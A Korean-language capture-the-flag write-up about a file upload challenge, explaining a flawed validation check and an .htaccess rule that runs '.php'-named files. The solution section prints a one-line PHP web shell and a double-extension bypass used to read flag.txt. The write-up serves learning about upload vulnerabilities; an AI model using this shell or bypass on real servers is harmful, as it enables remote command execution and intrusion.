---
tier: Bronze 2
topics:
  - File Upload
solved-with: Research
---
### 문제구조

목표: `/uploads` 폴더 외부의 `/flag.txt` 읽기

- `index.php`: 이미지 업로드 폼 제공
- `upload.php`: 업로드 파일 검증 +  `/uploads`에 저장
	- 허용 확장자 jpg, jpeg, png, gif
	- MIME 타입과 확장자가 모두 허용되지 않을 때만 업로드 거부 (하나만 검증되면 업로드 성공)
``` php
if (!in_array($mime_type, $allowed_mimes) && !in_array($check_extension, $allowed_extensions)) {
    die("<script>alert('Only images allowed.'); history.back();</script>");
}
```

- `uploads/.htaccess`: 업로드된 파일 목록 표시, `.php` 문자열이 있는 경우 php로 실행 
``` txt
<Files "*">
    Allow from all
</Files>

<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### 분석 및 풀이 

PHP 웹 셸 활용 
``` php
// shell.php
<?php system($_GET["cmd"]); ?>
```

`shell.php` 파일의 확장자를 `shell.php.png`로 수정하면 `upload.php`의 검증을 우회할 수 있고 `.php` 문자열이 있으므로 php 파일로 실행이 됨. 

파일을 업로드 후 `/uploads/shell.php.png?cmd=cat /../flag.txt`로 이동

### 시행 착오

파일 업로드 취약점의 대표적인 예시인 PHP 웹 셸을 아예 까먹고 있었음. 그래서 저장되는 파일 경로를 `/../../flag.txt.png` 이런식으로 해서 `flag.txt`에 접근하게 해서 화면에 보여지도록 하는 건줄 알았으나 어떤 파일이름을 하던 적절히 이스케이프가 돼어서 다른 디렉토리로 접근이 불가했음. 

### 새롭게 배운 점 

**웹 셸**: 공격자가 특정 엔드포인트에 HTTP 요청을 보내는 것만으로도 원격 웹 서버에서 임의의 명령을 실행할 수 있도록 해주는 악성 스크립트

https://velog.io/@mandu0707/%EC%B7%A8%EC%95%BD%EC%A0%90-%ED%8C%8C%EC%9D%BC-%EC%97%85%EB%A1%9C%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-File-Upload-Vulnerability

